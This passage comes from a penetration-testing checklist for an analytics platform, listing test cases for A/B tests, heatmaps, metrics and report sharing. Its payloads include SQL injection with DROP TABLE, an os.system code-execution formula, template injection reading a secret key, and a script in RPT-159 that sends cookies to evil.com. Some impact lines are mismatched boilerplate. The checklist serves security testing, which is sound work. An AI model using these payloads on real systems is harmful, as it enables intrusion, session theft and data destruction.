**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-133 — A/B Test Results Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Submit test results 2. Modify conversion data 3. Skew test results 4. False statistical significance

**Expected Result:** Results should be tamper-proof

**Payload Example:**

```
Submit fake conversion events for specific variant
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## RPT-134 — A/B Test SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Query test results 2. Inject SQL in filter 3. Extract all test data 4. Data breach

**Expected Result:** Test queries should be parameterized

**Payload Example:**

```
date_range='; SELECT * FROM ab_tests--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-135 — A/B Test XSS in Variant Name
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Create variant with XSS 2. View test 3. Variant name renders 4. XSS executes

**Expected Result:** Variant names should be sanitized

**Payload Example:**

```
<img src=x onerror=alert('XSS')>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-136 — A/B Test Assignment Bypass
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Check test assignment 2. Clear cookies 3. Get reassigned 4. Select preferred variant

**Expected Result:** Assignment should use multiple factors

**Payload Example:**

```
Cookie manipulation for variant selection
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Browser

**References:** CWE-840; PortSwigger Business logic

---

## RPT-137 — A/B Test Feature Flag Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. View test configuration 2. Find feature flags 3. Access unreleased features 4. Preview new functionality

**Expected Result:** Feature flags should be hidden

**Payload Example:**

```
Test config exposing internal feature names
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-138 — A/B Test Stop/Start IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Stop own test 2. Modify test_id 3. Stop others' test 4. Disrupt their testing

**Expected Result:** Control actions should verify ownership

**Payload Example:**

```
POST /api/ab-tests/victim_id/stop
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-139 — A/B Test Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Delete own test 2. Modify test_id 3. Delete others' test 4. Data destruction

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/ab-tests/victim_test_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-140 — A/B Test Results Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Export own results 2. Modify test_id 3. Export others' results 4. Competitive intelligence

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/ab-tests/victim_id/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-141 — A/B Test Traffic Split Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. Set traffic split 2. Modify split parameters 3. Send all traffic to one variant 4. Test invalidation

**Expected Result:** Split should be validated server-side

**Payload Example:**

```
{"variant_a":0,variant_b:100}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-142 — A/B Test Statistical Data Injection
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** A/B Testing

**Test Steps:** 1. View test statistics 2. Inject false data points 3. Manipulate significance 4. Premature test conclusion

**Expected Result:** Statistical data should be verified

**Payload Example:**

```
Inject conversions to force significance
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## RPT-143 — Heatmap IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. View own heatmap 2. Modify heatmap_id 3. View others' heatmap 4. Competitive intelligence

**Expected Result:** Heatmap access should verify ownership

**Payload Example:**

```
GET /api/heatmaps/victim_heatmap_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-144 — Heatmap Recording Privacy
**Test Category:** Privacy Violation · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Analyze heatmap recording 2. Find sensitive data 3. Expose user inputs 4. PII capture

**Expected Result:** Sensitive fields should be masked

**Payload Example:**

```
Heatmap recording showing password input
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Manual Analysis / Recording Tools

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## RPT-145 — Heatmap Session Replay IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. View own session replays 2. Modify session_id 3. View others' sessions 4. User activity exposure

**Expected Result:** Session replays should verify ownership

**Payload Example:**

```
GET /api/heatmaps/sessions/victim_session_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-146 — Heatmap Script Injection
**Test Category:** Cross-Site Scripting · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Modify heatmap tracking script 2. Inject malicious script 3. Script executes on victim site 4. Data theft

**Expected Result:** Scripts should be integrity-checked

**Payload Example:**

```
Inject XSS via compromised heatmap JS
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-147 — Heatmap Data Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Send heatmap data 2. Inject malicious coordinates 3. Data processed 4. DoS or corruption

**Expected Result:** Heatmap data should be validated

**Payload Example:**

```
Send millions of click coordinates
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-148 — Heatmap Cross-Site Data Leakage
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Heatmap on multiple sites 2. Access cross-site data 3. View behavior on other sites 4. Privacy violation

**Expected Result:** Heatmap data should be site-scoped

**Payload Example:**

```
Access heatmap data for unowned domains
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-149 — Heatmap URL Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. View heatmap URLs 2. Find internal URLs 3. Access internal pages 4. Information disclosure

**Expected Result:** URLs should be filtered or masked

**Payload Example:**

```
Heatmap showing internal admin URLs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Manual Review

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-150 — Heatmap Form Data Capture
**Test Category:** Privacy Violation · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Form on page 2. Heatmap records form 3. Form data captured 4. PII breach

**Expected Result:** Form inputs should be automatically masked

**Payload Example:**

```
Heatmap recording capturing credit card input
```

**Impact:** Privacy violation -&gt; exposure of personal data (PII) beyond the intended audience.

**Tools:** Manual Analysis / Recording Review

**References:** CWE-359; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP Privacy Risks; GDPR

---

## RPT-151 — Heatmap SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Query heatmap data 2. Inject SQL in filter 3. Extract all data 4. Data breach

**Expected Result:** Heatmap queries should be parameterized

**Payload Example:**

```
page_filter='; SELECT * FROM heatmaps--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-152 — Heatmap Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Delete own heatmap 2. Modify heatmap_id 3. Delete others' heatmap 4. Data destruction

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/heatmaps/victim_heatmap_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-153 — Heatmap Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. Export own heatmap 2. Modify heatmap_id 3. Export others' heatmap 4. Data theft

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/heatmaps/victim_id/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-154 — Heatmap Segment IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Heatmaps

**Test Steps:** 1. View heatmap segment 2. Modify segment_id 3. View restricted segment 4. Information disclosure

**Expected Result:** Segment access should verify permissions

**Payload Example:**

```
GET /api/heatmaps/123/segments/restricted
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-155 — Metric IDOR Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. View own metric 2. Modify metric_id 3. View others' metric 4. Competitive intelligence

**Expected Result:** Metric access should verify ownership

**Payload Example:**

```
GET /api/metrics/victim_metric_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-156 — Metric IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Edit own metric 2. Modify metric_id 3. Edit others' metric 4. Data manipulation

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/metrics/victim_metric_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-157 — Metric Formula Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Create metric formula 2. Inject malicious code 3. Formula executes 4. Code execution

**Expected Result:** Formulas should be safely parsed

**Payload Example:**

```
formula=eval(system('id')) or __import__('os').system('id')
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-158 — Metric SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Metric queries database 2. Inject SQL in metric definition 3. SQL executes 4. Data breach

**Expected Result:** Metric queries should be parameterized

**Payload Example:**

```
metric_query=SELECT * FROM users WHERE 1=1; DROP TABLE--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-159 — Metric XSS in Name
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Create metric with XSS name 2. View metrics list 3. XSS executes 4. Session theft

**Expected Result:** Metric names should be sanitized

**Payload Example:**

```
<script>document.location='http://evil.com?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-160 — Metric Data Source IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Create metric with data source 2. Modify data_source_id 3. Access unauthorized data 4. Cross-tenant access

**Expected Result:** Data sources should be access-controlled

**Payload Example:**

```
{"data_source":"victim_tenant_database"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-161 — Metric Calculation DoS
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Create complex metric 2. Trigger calculation 3. Exhaust resources 4. DoS

**Expected Result:** Calculation complexity should be limited

**Payload Example:**

```
Metric with recursive or infinite calculation
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-162 — Metric Division by Zero
**Test Category:** Denial of Service · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Create ratio metric 2. Set denominator to zero 3. Calculation error 4. Application error

**Expected Result:** Division by zero should be handled

**Payload Example:**

```
{"numerator":"revenue",denominator:"0"}
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Postman

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## RPT-163 — Metric Goal Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Set metric goal 2. Modify goal value 3. Artificially meet/miss goals 4. False reporting

**Expected Result:** Goals should be protected

**Payload Example:**

```
{"metric_id":"123",goal:0.0001}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-164 — Metric Aggregation Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. View aggregated metric 2. Request raw data 3. Access individual values 4. Privacy violation

**Expected Result:** Raw data should require permissions

**Payload Example:**

```
GET /api/metrics/123/raw bypassing aggregation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-165 — Metric Historical Data Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. View historical metric 2. Modify historical data 3. Alter trends 4. False analysis

**Expected Result:** Historical data should be immutable

**Payload Example:**

```
PUT /api/metrics/123/history/2024-01-01
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## RPT-166 — Metric Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Custom Metrics / KPIs

**Test Steps:** 1. Metric uses template 2. Inject template syntax 3. Template executes 4. Information disclosure

**Expected Result:** Metric templates should be sandboxed

**Payload Example:**

```
{{config.secret_key}} in metric formula
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## RPT-167 — Shared Report IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Share own report 2. Modify report_id 3. Share others' report 4. Unauthorized sharing

**Expected Result:** Sharing should verify ownership

**Payload Example:**

```
POST /api/reports/victim_report/share
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-168 — Share Link Token Enumeration
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Generate share link 2. Analyze token structure 3. Enumerate tokens 4. Access others' reports

**Expected Result:** Share tokens should be unpredictable

**Payload Example:**

```
Sequential or timestamp-based share tokens
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Sequencer / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## RPT-169 — Share Link Token Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Report requires token 2. Access without token 3. Bypass share protection 4. Unauthorized access

**Expected Result:** Token should be required for access

**Payload Example:**

```
Direct URL access without share token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-170 — Share Permission Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Receive view-only share 2. Modify permission level 3. Gain edit access 4. Modify report

**Expected Result:** Permissions should be server-enforced

**Payload Example:**

```
{"permission":"edit"} when only "view" granted
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-171 — Shared Report XSS
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Report contains XSS 2. Share report 3. Recipient views 4. XSS executes on recipient

**Expected Result:** Shared content should be sanitized

**Payload Example:**

```
Report with <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## RPT-172 — Share Link Expiration Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Create expiring share 2. Wait for expiration 3. Access expired link 4. Bypass expiration

**Expected Result:** Expiration should be enforced

**Payload Example:**

```
Access share link after expiry time
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-173 — Share Revocation Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Share report 2. Revoke share 3. Access with old link 4. Bypass revocation

**Expected Result:** Revocation should be immediate

**Payload Example:**

```
Access cached or bookmarked revoked link
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Browser Cache

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-174 — Share Notification Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Share report 2. Inject in notification message 3. Recipient receives malicious email 4. Phishing or XSS

**Expected Result:** Notification content should be sanitized

**Payload Example:**

```
message=<script>stealSession()</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## RPT-175 — Share Cross-Tenant
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Share within tenant 2. Modify recipient tenant 3. Share to other tenant 4. Cross-tenant access

**Expected Result:** Sharing should be tenant-scoped

**Payload Example:**

```
{"recipient_tenant":"competitor_tenant"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## RPT-176 — Public Share Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Create public share 2. Enumerate public shares 3. Find sensitive reports 4. Data exposure

**Expected Result:** Public shares should be truly public only

**Payload Example:**

```
/public/shares/1 through /public/shares/10000
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## RPT-177 — Share Password Brute Force
**Test Category:** Broken Authentication · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Report Sharing

**Test Steps:** 1. Share with password 2. Brute force password 3. Gain access 4. Bypass protection

**Expected Result:** Password attempts should be limited

**Payload Example:**

```
Common password wordlist
```

